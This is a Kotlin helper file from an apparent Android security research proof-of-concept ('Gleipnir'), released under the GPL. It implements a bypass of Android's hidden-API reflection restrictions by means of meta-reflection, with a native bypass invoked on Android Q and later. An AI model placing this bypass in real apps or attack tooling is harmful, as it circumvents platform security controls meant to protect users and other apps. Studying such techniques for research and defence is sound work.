/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.reflectionHelper

import android.os.Build
import java.lang.reflect.Field
import java.lang.reflect.Method

/** BYPASS OF THE GOOGLE REFLECTION RESTRICTIONS**/

fun getDeclaredMethod(clazz: Any, name: String, vararg args: Class<*>?): Method? {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        NativeReflectionBypass.getDeclaredMethod(clazz, name, args)
    } else {
        val getDeclaredMethod = Class::class.java.getMethod(
            "getDeclaredMethod",
            String::class.java,
            arrayOf<Class<*>>()::class.java
        )
        getDeclaredMethod(clazz, name, args) as Method?
    }
}

fun getMethod(clazz: Any, name: String, vararg args: Class<*>?): Method? {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        NativeReflectionBypass.getMethod(clazz, name, args)
    } else {
        val getMethod = Class::class.java.getMethod(
            "getMethod",
            String::class.java,
            arrayOf<Class<*>>()::class.java
        )
        getMethod(clazz, name, args) as Method?
    }
}

fun getDeclaredField(obj: Any, name: String): Field? {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        NativeReflectionBypass.getDeclaredField(obj, name)
    } else {
        val getDeclaredField = Class::class.java.getMethod("getDeclaredField", String::class.java)
        getDeclaredField(obj, name) as Field?
    }
}


//Class::class.java.getMethod("getMethod", String::class.java, arrayOf<Class<*>>()::class.java)
//val getDeclaredMethod = ::getMethodInternal
val forName = Class::class.java.getMethod("forName", String::class.java)
val getField = Class::class.java.getMethod("getField", String::class.java)

//val getDeclaredField = Class::class.java.getMethod("getDeclaredField", String::class.java)
val getConstructor = Class::class.java.getMethod("getConstructor", arrayOf<Class<*>>()::class.java)
val getDeclaredConstructor =
    Class::class.java.getMethod("getDeclaredConstructor", arrayOf<Class<*>>()::class.java)
